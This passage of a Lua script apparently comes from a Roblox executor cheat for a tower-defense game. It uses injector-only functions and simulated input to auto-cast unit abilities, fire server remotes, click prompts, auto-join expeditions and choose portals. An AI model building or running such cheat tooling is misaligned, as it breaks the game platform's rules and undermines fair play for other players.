            local targetTower = getTargetTowerByDisplayName(getgenv().SkeletonKnightTargetUnit)
            if not targetTower then
                task.wait(5)
                continue
            end
            
            if not targetTower.Parent then
                task.wait(5)
                continue
            end
                        
            local success, err = ErrorHandler:wrapAsync(function()
                local AbilityEvent = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Ability")
                if not AbilityEvent then
                    AbilityEvent = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Ability")
                end
                
                if AbilityEvent then
                    local result = AbilityEvent:InvokeServer(skeletonKnight, "Savior")                    
                    task.wait(0.5)
                    
                    local SelectUnitEvent = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("AbilityRemotes") and RS.Remotes.AbilityRemotes:FindFirstChild("SelectUnitInWorkspace")
                    if SelectUnitEvent then
                        SelectUnitEvent:FireServer(targetTower)
                        
                        getgenv().SkeletonKnightLastUse = tick()
                        
                        Window:Notify({
                            Title = "Auto Skeleton Knight",
                            Description = "Savior used on " .. getgenv().SkeletonKnightTargetUnit,
                            Lifetime = 3
                        })
                    end
                end
            end)
            task.wait(5)
        end
    end)
    
    task.spawn(function()
        task.wait(2)
        
        local function getAlucardTower()
            local towers = workspace:FindFirstChild("Towers")
            if not towers then 
                return nil 
            end
            
            for _, tower in pairs(towers:GetChildren()) do
                local owner = tower:FindFirstChild("Owner")
                if tower.Name == "Alucard2Evo" and owner and owner.Value == LocalPlayer then
                    return tower
                end
            end
            
            return nil
        end
        
        local function getTargetTowerByDisplayNameAlucard(displayName)
            if not displayName or displayName == "" or displayName == "No units placed yet" or displayName == "Place a unit first" then 
                return nil 
            end
            
            local towers = workspace:FindFirstChild("Towers")
            if not towers then return nil end
            
            for _, tower in pairs(towers:GetChildren()) do
                local owner = tower:FindFirstChild("Owner")
                if owner and owner.Value == LocalPlayer then
                    local towerName = tower.Name
                    local baseName = towerName:gsub("EZA$", "")
                    local towerDisplayName = getUnitDisplayName(baseName)
                    
                    if towerDisplayName == displayName then
                        return tower
                    end
                end
            end
            
            return nil
        end
        
        
        local lastWave = 0
        while true do
            task.wait(1)
            
            local currentWave = 0
            pcall(function()
                local wave = RS:FindFirstChild("Wave")
                if wave and wave.Value then
                    currentWave = wave.Value
                end
            end)
            
            if currentWave < lastWave and currentWave <= 5 then
                getgenv().AlucardHypnosisLastUse = 0
            end
            
            if getgenv().SeamlessFixEnabled and lastWave >= 50 and currentWave < 50 then
                getgenv().AlucardHypnosisLastUse = 0
            end
            
            if currentWave == 1 and lastWave > 10 then
                getgenv().AlucardHypnosisLastUse = 0
            end
            
            lastWave = currentWave
                        
            if not getgenv().AlucardHypnosisEnabled then
                task.wait(2)
                continue
            end
            
            local alucardTower = getAlucardTower()
            if not alucardTower then
                task.wait(2)
                continue
            end
            
            local upgrade = alucardTower:FindFirstChild("Upgrade")
            if not upgrade then
                task.wait(2)
                continue
            end
            
            local requiredLevel = 0
            
            if upgrade.Value < requiredLevel then
                task.wait(2)
                continue
            end
            
            local currentTime = tick()
            local baseCooldown = 200
            local timeScale = getCurrentTimeScale()
            local effectiveCooldown = baseCooldown / timeScale
            local timeSinceLastUse = currentTime - (getgenv().AlucardHypnosisLastUse or 0)
            
            if timeSinceLastUse < effectiveCooldown then
                task.wait(1)
                continue
            end
            
            if not getgenv().AlucardHypnosisTargetUnit or getgenv().AlucardHypnosisTargetUnit == "" then
                task.wait(5)
                continue
            end
            
            local targetTower = getTargetTowerByDisplayNameAlucard(getgenv().AlucardHypnosisTargetUnit)
            if not targetTower then
                task.wait(5)
                continue
            end
            
            if not targetTower.Parent then
                task.wait(5)
                continue
            end
                        
            local success, err = ErrorHandler:wrapAsync(function()
                local AbilityEvent = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Ability")
                if not AbilityEvent then
                    AbilityEvent = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Ability")
                end
                
                if AbilityEvent then
                    local result = AbilityEvent:InvokeServer(alucardTower, "Hypnosis")                    
                    task.wait(0.5)
                    
                    local SelectUnitEvent = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("AbilityRemotes") and RS.Remotes.AbilityRemotes:FindFirstChild("SelectUnitInWorkspace")
                    if SelectUnitEvent then
                        SelectUnitEvent:FireServer(targetTower)
                        
                        getgenv().AlucardHypnosisLastUse = tick()
                        
                        Window:Notify({
                            Title = "Auto True Dracula Hypnosis",
                            Description = "Hypnosis used on " .. getgenv().AlucardHypnosisTargetUnit,
                            Lifetime = 3
                        })
                    end
                end
            end)
            task.wait(5)
        end
    end)
end

end

task.spawn(function()
    ConnectionManager:trackGroup("GameState",
        LocalPlayer.PlayerGui.ChildAdded:Connect(function(child)
            if child.Name == "EndGameUI" then
                getgenv().BulmaWishUsedThisRound = false
                        getgenv().WukongTrackedClones = {}
                getgenv()._WukongLastSynthesisTime = 0
                getgenv().SkeletonKnightLastUse = 0
                getgenv().AlucardHypnosisLastUse = 0
                getgenv().OneEyeDevilCurrentIndex = 0 
                    
                    if getgenv()._EtoEvoAbilityUsed then
                        getgenv()._EtoEvoAbilityUsed = {}
                    end
                    
                    getgenv().GriffithLightUsedThisRound = false
                    
                    if getgenv().MacroRecordingV2 then
                        task.spawn(function()
                            task.wait(1)
                            
                            getgenv().MacroRecordingV2 = false
                            
                            if #getgenv().MacroDataV2 > 0 and getgenv().CurrentMacro then
                                local success = saveMacro(getgenv().CurrentMacro, getgenv().MacroDataV2)
                                if success then
                                    Window:Notify({
                                        Title = "Macro Recording",
                                        Description = "Auto-saved " .. #getgenv().MacroDataV2 .. " steps (game ended)",
                                        Lifetime = 5
                                    })
                                else
                                    Window:Notify({
                                        Title = "Macro Recording",
                                        Description = "Failed to auto-save macro",
                                        Lifetime = 3
                                    })
                                end
                            end
                            
                            getgenv().MacroStatusText = "Idle"
                            getgenv().MacroCurrentStep = 0
                            getgenv().MacroTotalSteps = 0
                            
                            if getgenv().UpdateMacroStatus then
                                getgenv().UpdateMacroStatus()
                            end
                            
                            pcall(function()
                                if getgenv().MacroRecordToggle then
                                    getgenv().MacroRecordToggle:UpdateState(false)
                                end
                            end)
                        end)
                    end
                end
            end),
            "Game State EndGameUI Tracking"
        )
    end)
end

getgenv()._SIGIL_ORDER = {
    [0] = "Ocular Sigil: Eye",
    [1] = "Ocular Sigil: Mouth",
    [2] = "Ocular Sigil: Arm",
    [3] = "Ocular Sigil: Leg"
}

if not getgenv()._EtoEvoAbilityUsed then
    getgenv()._EtoEvoAbilityUsed = {}
end

getgenv()._GetEtoEvoTower = function()
    local towers = workspace:FindFirstChild("Towers")
    if not towers then return nil end
    for _, tower in pairs(towers:GetChildren()) do
        local owner = tower:FindFirstChild("Owner")
        if tower.Name == "EtoEvo" and owner and owner.Value == LocalPlayer then
            return tower
        end
    end
    return nil
end

getgenv()._GetTowerInfoName = function(tower)
    if not tower then return nil end
    local config = tower:FindFirstChild("Config")
    if config then
        local infoName = config:FindFirstChild("InfoName")
        if infoName and infoName.Value then
            return infoName.Value
        end
    end
    return tower.Name
end

getgenv()._GetUpgradeLevel = function(tower)
    if not tower then return 0 end
    local upgrade = tower:FindFirstChild("Upgrade")
    return upgrade and upgrade.Value or 0
end

getgenv()._GetCurrentTimeScale = function()
    local ok, res = pcall(function()
        local timeScale = RS:FindFirstChild("TimeScale")
        if timeScale and timeScale:IsA("NumberValue") then
            return timeScale.Value or 1
        end
        return 1
    end)
    return ok and res or 1
end

getgenv()._ResetEtoEvoCooldowns = function()
    if getgenv()._EtoEvoAbilityUsed then
        getgenv()._EtoEvoAbilityUsed = {}
    end
    print("[One Eye Devil] Cooldowns reset")
end

getgenv()._IsOnCooldown = function(infoName, abilityName, unitName)
    if not getgenv()._EtoEvoAbilityUsed[infoName] then
        return false
    end
    local lastUse = getgenv()._EtoEvoAbilityUsed[infoName][abilityName]
    if not lastUse then return false end
    local baseCooldown = 50
    local towerInfo = getgenv().MacroTowerInfoCache
    if towerInfo and towerInfo[unitName] then
        for level, data in pairs(towerInfo[unitName]) do
            if data.Abilities then
                for _, abilityData in ipairs(data.Abilities) do
                    if abilityData.Name == abilityName then
                        baseCooldown = abilityData.Cd or 50
                        break
                    end
                end
            end
        end
    end
    local timeScale = getgenv()._GetCurrentTimeScale()
    local effectiveCooldown = baseCooldown / timeScale
    local elapsed = tick() - lastUse
    return elapsed < effectiveCooldown
end

getgenv()._SetAbilityUsed = function(infoName, abilityName)
    if not getgenv()._EtoEvoAbilityUsed[infoName] then
        getgenv()._EtoEvoAbilityUsed[infoName] = {}
    end
    getgenv()._EtoEvoAbilityUsed[infoName][abilityName] = tick()
end

getgenv()._GetCardButtons = function()
    local ok, result = pcall(function()
        local prompt = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
        if not prompt or not prompt.Enabled then return nil end
        local frame = prompt:FindFirstChild("Frame")
        if not frame then return nil end
        local frame2 = frame:FindFirstChild("Frame")
        if not frame2 then return nil end
        local frame3 = frame2:FindFirstChild("Frame")
        if not frame3 then return nil end
        local frame4 = frame3:FindFirstChild("Frame")
        if not frame4 then return nil end
        local buttons = {}
        for _, child in ipairs(frame4:GetChildren()) do
            if child:IsA("TextButton") then
                table.insert(buttons, child)
            end
        end
        return #buttons > 0 and buttons or nil
    end)
    return ok and result or nil
end

getgenv()._GetCardName = function(button)
    local ok, result = pcall(function()
        local function searchForTextLabel(parent, depth)
            if depth > 10 then return nil end
            for _, child in ipairs(parent:GetChildren()) do
                if child:IsA("TextLabel") and child.Text ~= "" and child.Text:find("Ocular Sigil") then
                    return child.Text
                end
                if child:IsA("Frame") or child:IsA("Folder") then
                    local found = searchForTextLabel(child, depth + 1)
                    if found then return found end
                end
            end
            return nil
        end
        return searchForTextLabel(button, 0)
    end)
    return ok and result or nil
end

getgenv()._ClickButton = function(button)
    if not button then return false end
    getgenv()._SkipRecordingNextCall = true
    local success = false
    if getconnections then
        pcall(function()
            local events = {"Activated", "MouseButton1Click", "MouseButton1Down"}
            for _, eventName in ipairs(events) do
                local connections = getconnections(button[eventName])
                if connections then
                    for _, conn in ipairs(connections) do
                        if conn and conn.Fire then
                            conn:Fire()
                            success = true
                        end
                    end
                end
            end
        end)
    end
    if not success then
        pcall(function()
            local GuiService = game:GetService("GuiService")
            pcall(function() GuiService.SelectedObject = nil end)
            task.wait(0.05)
            if button and button:IsDescendantOf(LocalPlayer.PlayerGui) then
                pcall(function() GuiService.SelectedObject = button end)
                task.wait(0.1)
                VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                task.wait(0.02)
                VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                success = true
            end
        end)
    end
    getgenv()._SkipRecordingNextCall = false
    return success
end

if not getgenv()._FindFirst then
    getgenv()._FindFirst = function(list, pred)
        local i = 1
        while list and i <= #list do
            local v = list[i]
            if pred(v) then return v end
            i = i + 1
        end
        return nil
    end
end

task.spawn(function()
    getgenv()._EtoLastWave = 0
    getgenv()._EtoIsWaitingForPrompt = false
    getgenv()._EtoPromptWaitStart = 0
    getgenv()._EtoLastGameStarted = true
    
    while true do
        task.wait(0.3)
        
        if not getgenv().OneEyeDevilEnabled then
            task.wait(2)
            continue
        end
        
        pcall(function()
            local gameStarted = true
            pcall(function()
                local gs = RS:FindFirstChild("GameStarted")
                if gs and gs.Value ~= nil then
                    gameStarted = gs.Value
                end
            end)
            
            if getgenv().SeamlessFixEnabled and getgenv()._EtoLastGameStarted and not gameStarted then
                getgenv()._ResetEtoEvoCooldowns()
                getgenv()._EtoIsWaitingForPrompt = false
            end
            getgenv()._EtoLastGameStarted = gameStarted
            
            local currentWave = 0
            pcall(function()
                local wave = RS:FindFirstChild("Wave")
                if wave and wave:IsA("NumberValue") then
                    currentWave = wave.Value
                end
            end)
            
            if currentWave < getgenv()._EtoLastWave then
                getgenv()._ResetEtoEvoCooldowns()
                getgenv()._EtoIsWaitingForPrompt = false
            end
            
            getgenv()._EtoLastWave = currentWave
            
            local tower = getgenv()._GetEtoEvoTower()
            if not tower then 
                getgenv()._EtoIsWaitingForPrompt = false
                return 
            end
            
            local infoName = getgenv()._GetTowerInfoName(tower)
            local towerLevel = getgenv()._GetUpgradeLevel(tower)
            
            if towerLevel < 3 then
                return
            end
            
            local buttons = getgenv()._GetCardButtons()
            
            if buttons and #buttons > 0 then
                if getgenv()._EtoIsWaitingForPrompt and tick() - getgenv()._EtoPromptWaitStart > 5 then
                    print("[One Eye Devil] Timeout waiting for prompt, resetting")
                    getgenv()._EtoIsWaitingForPrompt = false
                end
                
                local targetCard = getgenv()._SIGIL_ORDER[getgenv().OneEyeDevilCurrentIndex]
                
                local targetButton = getgenv()._FindFirst(buttons, function(b)
                    local name = getgenv()._GetCardName(b)
                    return name and name == targetCard
                end)
                
                if targetButton and getgenv()._ClickButton(targetButton) then
                    getgenv()._EtoIsWaitingForPrompt = false
                    
                    getgenv()._SetAbilityUsed(infoName, "Detachment")
                    
                    local timeScale = getgenv()._GetCurrentTimeScale()
                    local baseCd = 50
                    local effectiveCd = baseCd / timeScale
                    
                    getgenv().OneEyeDevilCurrentIndex = (getgenv().OneEyeDevilCurrentIndex + 1) % 4
                    
                    local nextCard = getgenv()._SIGIL_ORDER[getgenv().OneEyeDevilCurrentIndex]
                    local cdText = string.format("%.1fs", effectiveCd)
                    if timeScale ~= 1 then
                        cdText = cdText .. " (x" .. timeScale .. " speed)"
                    end
                    
                    Window:Notify({
                        Title = "One Eye Devil",
                        Description = "Selected: " .. (getgenv()._GetCardName(targetButton) or targetCard),
                        Lifetime = 2
                    })
                    
                    return
                end
            end
            
            if not getgenv()._EtoIsWaitingForPrompt and not getgenv()._IsOnCooldown(infoName, "Detachment", "EtoEvo") then
                print("[One Eye Devil] Using Detachment ability")
                local abilityUsed, abilityResult = pcall(function()
                    return RS.Remotes.Ability:InvokeServer(tower, "Detachment")
                end)
                
                if abilityUsed and abilityResult then
                    print("[One Eye Devil] Detachment used successfully, waiting for prompt")
                    getgenv()._EtoIsWaitingForPrompt = true
                    getgenv()._EtoPromptWaitStart = tick()
                else
                    print("[One Eye Devil] Detachment failed or returned false")
                end
            end
        end)
    end
end)

if not getgenv().GriffithLightUsedThisRound then
    getgenv().GriffithLightUsedThisRound = false
end

getgenv()._GetGriffithEclipseTower = function()
    local towers = workspace:FindFirstChild("Towers")
    if not towers then return nil end
    for _, tower in pairs(towers:GetChildren()) do
        local owner = tower:FindFirstChild("Owner")
        if tower.Name == "GriffithEclipse" and owner and owner.Value == LocalPlayer then
            return tower
        end
    end
    return nil
end

getgenv()._GetGriffithCardButtons = function()
    local ok, result = pcall(function()
        local prompt = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
        if not prompt or not prompt.Enabled then return nil end
        local frame = prompt:FindFirstChild("Frame")
        if not frame then return nil end
        local frame2 = frame:FindFirstChild("Frame")
        if not frame2 then return nil end
        local frame3 = frame2:FindFirstChild("Frame")
        if not frame3 then return nil end
        local frame4 = frame3:FindFirstChild("Frame")
        if not frame4 then return nil end
        local buttons = {}
        for _, child in ipairs(frame4:GetChildren()) do
            if child:IsA("TextButton") then
                table.insert(buttons, child)
            end
        end
        return #buttons > 0 and buttons or nil
    end)
    return ok and result or nil
end

getgenv()._GetGriffithCardName = function(button)
    local ok, result = pcall(function()
        local function searchForTextLabel(parent, depth)
            if depth > 10 then return nil end
            for _, child in ipairs(parent:GetChildren()) do
                if child:IsA("TextLabel") and child.Text ~= "" then
                    local text = child.Text:gsub("<[^>]+>", ""):gsub("%s+", " "):match("^%s*(.-)%s*$")
                    if text:find("Light Sacrifice") then
                        return text
                    end
                end
                if child:IsA("Frame") or child:IsA("Folder") then
                    local found = searchForTextLabel(child, depth + 1)
                    if found then return found end
                end
            end
            return nil
        end
        return searchForTextLabel(button, 0)
    end)
    return ok and result or nil
end

getgenv()._ClickGriffithButton = function(button)
    if not button then return false end
    local success = false
    if getconnections then
        pcall(function()
            local events = {"Activated", "MouseButton1Click", "MouseButton1Down"}
            for _, eventName in ipairs(events) do
                local connections = getconnections(button[eventName])
                if connections then
                    for _, conn in ipairs(connections) do
                        if conn and conn.Fire then
                            conn:Fire()
                            success = true
                        end
                    end
                end
            end
        end)
    end
    if not success then
        pcall(function()
            local GuiService = game:GetService("GuiService")
            pcall(function() GuiService.SelectedObject = nil end)
            task.wait(0.05)
            if button and button:IsDescendantOf(LocalPlayer.PlayerGui) then
                pcall(function() GuiService.SelectedObject = button end)
                task.wait(0.1)
                VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                task.wait(0.02)
                VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                success = true
            end
        end)
    end
    getgenv()._SkipRecordingNextCall = false
    return success
end

getgenv()._GetCurrentCash = function()
    local ok, cash = pcall(function()
        local cashValue = LocalPlayer:FindFirstChild("Cash")
        if cashValue and cashValue:IsA("NumberValue") then
            return cashValue.Value
        end
        return 0
    end)
    return ok and cash or 0
end

task.spawn(function()
    getgenv()._GriffithLastWave = 0
    getgenv()._GriffithIsWaitingForPrompt = false
    getgenv()._GriffithPromptWaitStart = 0
    getgenv()._GriffithCashAboveThresholdStart = 0
    getgenv()._GriffithCashStabilityDuration = 3
    getgenv()._GriffithLastGameStarted = true
        
    while true do
        task.wait(0.3)
        
        if not getgenv().GriffithLightEnabled then
            task.wait(2)
            continue
        end
        
        pcall(function()
            local gameStarted = true
            pcall(function()
                local gs = RS:FindFirstChild("GameStarted")
                if gs and gs.Value ~= nil then
                    gameStarted = gs.Value
                end
            end)
            
            if getgenv().SeamlessFixEnabled and getgenv()._GriffithLastGameStarted and not gameStarted then
                getgenv().GriffithLightUsedThisRound = false
                getgenv()._GriffithIsWaitingForPrompt = false
                getgenv()._GriffithCashAboveThresholdStart = 0
            end
            getgenv()._GriffithLastGameStarted = gameStarted
            
            local currentWave = 0
            pcall(function()
                local wave = RS:FindFirstChild("Wave")
                if wave and wave:IsA("NumberValue") then
                    currentWave = wave.Value
                end
            end)
            
            if currentWave < getgenv()._GriffithLastWave then
                getgenv().GriffithLightUsedThisRound = false
                getgenv()._GriffithIsWaitingForPrompt = false
                getgenv()._GriffithCashAboveThresholdStart = 0
            end
            
            getgenv()._GriffithLastWave = currentWave
            
            if getgenv().GriffithLightUsedThisRound then
                return
            end
            
            local tower = getgenv()._GetGriffithEclipseTower()
            if not tower then 
                getgenv()._GriffithIsWaitingForPrompt = false
                getgenv()._GriffithCashAboveThresholdStart = 0
                return 
            end
            
            local buttons = getgenv()._GetGriffithCardButtons()
            
            if buttons then
                if getgenv()._GriffithIsWaitingForPrompt and tick() - getgenv()._GriffithPromptWaitStart > 5 then
                    getgenv()._GriffithIsWaitingForPrompt = false
                    return
                end
                
                if not getgenv()._GriffithIsWaitingForPrompt then
                    getgenv()._GriffithIsWaitingForPrompt = true
                    getgenv()._GriffithPromptWaitStart = tick()
                end
                
                local foundCard = false
                for _, button in ipairs(buttons) do
                    local cardName = getgenv()._GetGriffithCardName(button)
                    if cardName and cardName:find("Light Sacrifice") then
                        print("[Griffith Light] Clicking: " .. cardName)
                        
                        if getgenv()._ClickGriffithButton(button) then
                            foundCard = true
                            getgenv()._GriffithIsWaitingForPrompt = false
                            getgenv().GriffithLightUsedThisRound = true
                            getgenv()._GriffithCashAboveThresholdStart = 0
                            
                            print("[Griffith Light] Light Sacrifice selected - will not use again this round")
                            
                            Window:Notify({
                                Title = "Griffith Light",
                                Description = "Light Sacrifice selected! Unit transformed to Umbral Prince",
                                Lifetime = 3
                            })
                            
                            break
                        end
                    end
                end

                return
            end
            
            if not getgenv()._GriffithIsWaitingForPrompt then
                local currentCash = getgenv()._GetCurrentCash()
                
                if currentCash >= 50000 then
                    if getgenv()._GriffithCashAboveThresholdStart == 0 then
                        getgenv()._GriffithCashAboveThresholdStart = tick()
                        print("[Griffith Light] Cash reached 50k+ - waiting " .. getgenv()._GriffithCashStabilityDuration .. "s for stability...")
                    end
                    
                    local timeAboveThreshold = tick() - getgenv()._GriffithCashAboveThresholdStart
                    
                    if timeAboveThreshold >= getgenv()._GriffithCashStabilityDuration then
                        local abilityUsed, abilityResult = pcall(function()
                            return RS.Remotes.Ability:InvokeServer(tower, "Sacrifice")
                        end)
                        
                        if abilityUsed and abilityResult then
                            getgenv()._GriffithIsWaitingForPrompt = true
                            getgenv()._GriffithPromptWaitStart = tick()
                            print("[Griffith Light] Sacrifice ability used at " .. currentCash .. " cash (stable for " .. string.format("%.1f", timeAboveThreshold) .. "s)")
                        else
                            getgenv()._GriffithCashAboveThresholdStart = 0
                        end
                    end
                else
                    if getgenv()._GriffithCashAboveThresholdStart > 0 then
                        print("[Griffith Light] Cash dropped below 50k - resetting stability timer")
                        getgenv()._GriffithCashAboveThresholdStart = 0
                    end
                end
            end
        end)
    end
end)

task.spawn(function()
    getgenv()._AbilityResetLastWave = 0
    while true do
        task.wait(1)
        pcall(function()
            local wave = RS:FindFirstChild("Wave")
            if wave and wave:IsA("NumberValue") then
                local currentWave = wave.Value
                
                if currentWave < getgenv()._AbilityResetLastWave and currentWave <= 5 then
                    getgenv().BulmaWishUsedThisRound = false
                    getgenv().WukongTrackedClones = {}
                    getgenv()._WukongLastSynthesisTime = 0
                    getgenv().SkeletonKnightLastUse = 0
                    getgenv().AlucardHypnosisLastUse = 0
                    getgenv().OneEyeDevilCurrentIndex = 0 
                    getgenv().GriffithLightUsedThisRound = false
                end
                
                getgenv()._AbilityResetLastWave = currentWave
            end
        end)
    end
end)


task.spawn(function()
    while true do
        task.wait(2)
        
        local currentlyInLobby = false
        pcall(function()
            local lobbyCheck = workspace:FindFirstChild("Lobby")
            currentlyInLobby = lobbyCheck ~= nil
        end)
        
        if currentlyInLobby and (getgenv().FinalExpAutoJoinEasyEnabled or getgenv().FinalExpAutoJoinHardEnabled) then
            pcall(function()
                local finalExpRemote = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("FinalExpeditionStart")
                if finalExpRemote then
                    if getgenv().FinalExpAutoJoinEasyEnabled then
                        finalExpRemote:FireServer("Easy")
                    elseif getgenv().FinalExpAutoJoinHardEnabled then
                        finalExpRemote:FireServer("Hard")
                    end
                end
            end)
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(1)
        
        local currentlyInLobby = false
        pcall(function()
            local lobbyCheck = workspace:FindFirstChild("Lobby")
            currentlyInLobby = lobbyCheck ~= nil
        end)
        
        if not currentlyInLobby then
            pcall(function()
                local promptUI = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
                if not promptUI then return end
                
                local frame = promptUI:FindFirstChild("Frame")
                if not frame then return end
                
                local function clickOptionButton(button)
                    if not button then return false end
                    getgenv()._SkipRecordingNextCall = true
                    local events = {"Activated", "MouseButton1Click", "MouseButton1Down", "MouseButton1Up"}
                    for _, ev in ipairs(events) do
                        pcall(function()
                            for _, conn in ipairs(getconnections(button[ev])) do
                                conn:Fire()
                            end
                        end)
                        task.wait(0.05)
                    end
                    getgenv()._SkipRecordingNextCall = false
                    return true
                end
                
                local function findOptionsWithButtons()
                    local options = {}
                    local innerFrames = frame:GetDescendants()
                    for _, obj in pairs(innerFrames) do
                        if obj:IsA("TextButton") then
                            for _, child in pairs(obj:GetDescendants()) do
                                if child:IsA("TextLabel") and child.Text and child.Text ~= "" then
                                    local text = child.Text:gsub("<[^>]+>", ""):gsub("%s+", " "):match("^%s*(.-)%s*$")
                                    if text ~= "" and #text < 100 then
                                        options[text] = obj
                                    end
                                end
                            end
                        end
                    end
                    return options
                end
                
                local availableOptions = findOptionsWithButtons()
                if next(availableOptions) == nil then return end
                
                if getgenv().FinalExpSkipRewardsEnabled then
                    if availableOptions["Click anywhere to continue"] or availableOptions["(Click anywhere to continue)"] then
                        print("[Final Expedition] Reward screen detected - tracking rewards before skip")
                        
                        pcall(function()
                            local promptGui = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
                            if promptGui then
                                local allTexts = {}
                                for _, descendant in ipairs(promptGui:GetDescendants()) do
                                    if descendant:IsA("TextLabel") and descendant.Text and descendant.Text ~= "" then
                                        local text = descendant.Text:match("^%s*(.-)%s*$")
                                        if text ~= "" and not text:find("Click") and not text:find("continue") then
                                            table.insert(allTexts, text)
                                        end
                                    end
                                end
                                
                                local chestTypes = {"Shabby", "Standard", "Prismatic", "Godly"}
                                local rewardQuantity = nil
                                local ownedQuantity = nil
                                local foundChestType = nil
                                local foundLoot = false
                                local foundChest = false
                                
                                for _, text in ipairs(allTexts) do
                                    if text:match("^Owned:%s*%d+x$") then
                                        ownedQuantity = tonumber(text:match("%d+"))
                                    elseif text:match("^%d+x$") then
                                        rewardQuantity = tonumber(text:match("%d+"))
                                    end
                                    
                                    for _, chestType in ipairs(chestTypes) do
                                        if text == chestType then
                                            foundChestType = chestType
                                            break
                                        end
                                    end
                                    
                                    if text == "Loot" then
                                        foundLoot = true
                                    end
                                    
                                    if text == "Chest" or text:lower():find("chest") then
                                        foundChest = true
                                    end
                                end
                                
                                if foundChestType and foundLoot and foundChest then
                                    local chestName = foundChestType .. " Loot Chest"
                                    local quantity = rewardQuantity or 1
                                    local owned = ownedQuantity or 0
                                    
                                    if not getgenv().FinalExpChestRewards then
                                        getgenv().FinalExpChestRewards = {}
                                    end
                                    
                                    if not getgenv().FinalExpChestRewards[chestName] then
                                        getgenv().FinalExpChestRewards[chestName] = {amount = 0, owned = owned}
                                    end
                                    
                                    getgenv().FinalExpChestRewards[chestName].amount = getgenv().FinalExpChestRewards[chestName].amount + quantity
                                    getgenv().FinalExpChestRewards[chestName].owned = owned
                                end
                            end
                        end)
                        
                        task.wait(0.5)
                        
                        local textButton = frame:FindFirstChild("TextButton")
                        if textButton and textButton.Visible then
                            clickOptionButton(textButton)
                            task.wait(0.3)
                            return
                        end
                        
                        local folder = frame:FindFirstChild("Folder")
                        if folder then
                            local folderButton = folder:FindFirstChild("TextButton")
                            if folderButton and folderButton.Visible then
                                clickOptionButton(folderButton)
                                task.wait(0.3)
                                return
                            end
                        end
                    end
                end
                
                if getgenv().FinalExpAutoSkipShopEnabled and availableOptions["Shop"] then
                    clickOptionButton(availableOptions["Shop"])
                    task.wait(0.5)
                    
                    local shopButtonClicked = false
                    local maxAttempts = 10
                    for attempt = 1, maxAttempts do
                        local screenGui = LocalPlayer.PlayerGui:FindFirstChild("ScreenGui")
                        if screenGui then
                            local shopFrame = screenGui:FindFirstChild("Frame")
                            if shopFrame then
                                local children = shopFrame:GetChildren()
                                if children[4] then
                                    local innerFrame = children[4]:FindFirstChild("Frame")
                                    if innerFrame then
                                        local folder = innerFrame:FindFirstChild("Folder")
                                        if folder then
                                            local shopButton = folder:FindFirstChild("TextButton")
                                            if shopButton then
                                                clickOptionButton(shopButton)
                                                shopButtonClicked = true
                                                task.wait(0.3)
                                                break
                                            end
                                        end
                                    end
                                end
                            end
                        end
                        task.wait(0.2)
                    end
                    
                    if not shopButtonClicked then
                        print("[Final Expedition] Shop button not found after " .. maxAttempts .. " attempts")
                    end
                    return
                end
                
                if getgenv().FinalExpAutoSelectModeEnabled then
                    local priorities = {
                        {name = "Rest Point", priority = getgenv().FinalExpRestPriority or 3},
                        {name = "Dungeon", priority = getgenv().FinalExpDungeonPriority or 1},
                        {name = "Double Dungeon", priority = getgenv().FinalExpDoubleDungeonPriority or 2},
                        {name = "Shop", priority = getgenv().FinalExpShopPriority or 4}
                    }
                    
                    table.sort(priorities, function(a, b) return a.priority < b.priority end)
                    
                    for _, option in ipairs(priorities) do
                        if availableOptions[option.name] then
                            clickOptionButton(availableOptions[option.name])
                            task.wait(0.3)
                            
                            if option.name == "Rest Point" then
                                task.wait(0.5)
                                pcall(function()
                                    local screenGui = LocalPlayer.PlayerGui:FindFirstChild("ScreenGui")
                                    if screenGui then
                                        local restFrame = screenGui:FindFirstChild("Frame")
                                        if restFrame then
                                            local children = restFrame:GetChildren()
                                            if children[4] then
                                                local innerFrame = children[4]:FindFirstChild("Frame")
                                                if innerFrame then
                                                    local folder = innerFrame:FindFirstChild("Folder")
                                                    if folder then
                                                        local closeButton = folder:FindFirstChild("TextButton")
                                                        if closeButton then
                                                            clickOptionButton(closeButton)
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end)
                            elseif option.name == "Shop" then
                                print("[Final Expedition] Shop selected - Auto Skip Shop will handle it if enabled")
                            end
                            
                            return
                        end
                    end
                end
            end)
        end
    end
end)


local function findBestPortalFromClientData()
    local clientData = getClientData()
    if not clientData or not clientData.PortalData then 
        return nil 
    end
    
    local selectedMap = getgenv().PortalConfig.selectedMap
    local targetTier = getgenv().PortalConfig.tier
    local useBestPortal = getgenv().PortalConfig.useBestPortal
    local priorities = getgenv().PortalConfig.priorities

    
    local matchingPortals = {}
    
    for portalID, portalInfo in pairs(clientData.PortalData) do
        pcall(function()
            if type(portalInfo) == "table" and portalInfo.PortalData then
                local portalData = portalInfo.PortalData
                if not portalData or type(portalData) ~= "table" then return end
                
                local mapMatch = (selectedMap == "" or portalData.Map == selectedMap)
                
                if mapMatch then
                    table.insert(matchingPortals, {
                        id = portalID,
                        tier = portalData.Tier or 0,
                        challenge = portalData.Challenges or "",
                        map = portalData.Map or ""
                    })
                end
            end
        end)
    end
    
    if #matchingPortals == 0 then 
        return nil 
    end
        
    if useBestPortal then
        table.sort(matchingPortals, function(a, b)
            return a.tier > b.tier
        end)
        
        local bestTier = matchingPortals[1].tier
        local bestTierPortals = {}
        
        for _, portal in ipairs(matchingPortals) do
            if portal.tier == bestTier then
                table.insert(bestTierPortals, portal)
            end
        end
        
        for priority = 1, 6 do
            for challengeName, priorityNum in pairs(priorities) do
                if priorityNum == priority and priorityNum > 0 then
                    for _, portal in ipairs(bestTierPortals) do
                        if portal.challenge == challengeName then
                            return portal.id
                        end
                    end
                end
            end
